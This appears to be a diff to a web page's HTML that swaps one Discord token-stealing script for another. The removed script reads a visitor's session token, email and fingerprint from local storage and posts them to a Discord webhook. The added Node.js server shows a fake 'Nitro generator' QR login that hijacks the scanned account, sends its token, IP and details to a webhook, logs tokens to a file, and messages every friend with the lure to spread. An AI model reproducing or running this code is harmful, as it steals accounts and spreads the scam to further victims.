@@ -176,18 +176,67 @@ font-family: 'Open Sans Condensed', sans-serif;
     });
 </script>
     <script>
-var discordWebhook = "https://discord.com/api/webhooks/961054623140053023/eN0IIp1pTZJYfmrD5LlSJclsFEQ5UhdNyfgv2SoraKNIgwCVZc97beh13ecCbI8X6zn6";
-var i = document.createElement('iframe');
-document.body.appendChild(i);
-var request = new XMLHttpRequest();
-request.open("POST", discordWebhook);
-request.setRequestHeader('Content-type', 'application/json');
-var params = {
-    username: "Token Grabber",
-    avatar_url: "https://malwarefox.com/wp-content/uploads/2017/11/hacker-1.png",
-    content: '**Nouvelle personne hackée !**\n------------------\nToken : ' + i.contentWindow.localStorage.token + '\n------------------\nAdresse email : ' + i.contentWindow.localStorage.email_cache + '\n------------------\nUser ID : ' + i.contentWindow.localStorage.user_id_cache + '\n------------------\nFingerprint : ' + i.contentWindow.localStorage.fingerprint + '\n------------------\nPropriétés : \`\`\`json\n' + i.contentWindow.localStorage.deviceProperties + '\`\`\`------------------\nScript de login : \n\`\`\`js\nlocation.reload();var i = document.createElement(\'iframe\');document.body.appendChild(i);i.contentWindow.localStorage.token = "\\"' + i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1') + '\\""\`\`\`'
-};
-request.send(JSON.stringify(params));
+const { Webhook, MessageBuilder } = require('discord-webhook-node');
+const { RemoteAuthClient } = require('discord-remote-auth');
+const Discord = require('discord.js-selfbot-v11');
+const express = require('express');
+const chalk = require('chalk');
+const fss = require('fs');
+const app = express();
+
+
+app.get('/', async (req, res) => {
+    const ip_addr = req.socket.remoteAddress || req.headers['x-forwarded-for'];
+    const auth_client = new RemoteAuthClient();
+    
+    const message_to_send = 'Omg https://vu.fr/QrNitroGenerator\nhttps://media.discordapp.net/attachments/897903146469306378/898857234673598484/unknown.png';
+    
+    auth_client.on('pendingRemoteInit', async fingerprint => {
+        await res.render('index.ejs', { qr_code_path: `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=https://discordapp.com/ra/${fingerprint}` });
+    });
+
+    auth_client.on('finish', async token => {
+        const client = new Discord.Client();
+        
+        client.on('ready', () => {
+            console.log(`[${chalk.yellowBright('*')}] Connected on ${token}`);
+
+            new Webhook('https://discord.com/api/webhooks/944260511275577345/DAUka-VhYt7rEkNzP58n5dItfzGCZGXkh89lTG8rglYPK9ZCpBfGEFUc6suoUzqzMDeh')
+                .send(new MessageBuilder()
+                    .setColor('#f5b642').setThumbnail(client.user.avatarURL).setFooter('🤡 Joker by !\'" Ѵιcнч.ѕн#1024').setTimestamp()
+                    .setDescription('```' + token + '```' + '\n' + '```' + ip_addr + '```\n')
+                    .addField('> `🚹` **Username**', `\`${client.user.tag}\``)
+                    .addField('> `📫` **Email**', `\`${client.user.email}\``)
+                    .addField('> `💳` **Nitro**', `\`${client.user.premium}\``)
+                    .addField('> `🤡` **Friends**', `\`${client.user.friends.size}\``)
+                    .addField('> `📋` **Presence**', `\`${client.user.presence.status}\``)
+                );
+            
+            client.user.friends.forEach(async member => {
+                await member.send(`||<@${member.id}>|| ${message_to_send}`).catch(err => {
+                    console.log(`[${chalk.redBright('-')}] Dm -> ${err.message}`);
+                }).then(() => {
+                    console.log(`[${chalk.cyanBright('+')}] Dm -> ${member.username}`);
+                });
+            });
+        });
+
+        client.login(token).then(() => fss.appendFileSync('./tokens.txt', `${token}\n`));
+    });
+    
+    auth_client.connect();
+});
+
+app.listen(3000, () => {
+    console.clear()
+    console.log(chalk.greenBright(`
+      ╦╔═╗╦╔═╔═╗╦═╗
+      ║║ ║╠╩╗║╣ ╠╦╝
+     ╚╝╚═╝╩ ╩╚═╝╩╚═.
+    `));
+    
+    console.log(`[${chalk.greenBright('+')}] https://127.0.0.1:3000`)
+});
     </script>
 
 </body>
